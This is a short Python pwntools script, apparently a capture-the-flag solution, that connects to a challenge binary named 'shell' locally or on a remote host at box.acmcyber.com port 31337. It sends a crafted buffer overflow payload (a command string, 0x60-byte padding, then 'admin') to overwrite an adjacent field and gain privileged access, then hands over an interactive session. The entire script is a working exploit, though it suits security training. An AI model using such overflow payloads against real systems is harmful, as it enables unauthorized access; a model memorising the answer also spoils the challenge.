#!/usr/bin/env python3

from pwn import *

exe = ELF("./shell")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("box.acmcyber.com", 31337)

    return r


def main():
    r = conn()

    r.sendlineafter(b'', b''.join([
        b'gib-flag\x00',
        b'A' * (0x60 - 9),
        b'admin\x00'
    ]))

    r.interactive()


if __name__ == "__main__":
    main()
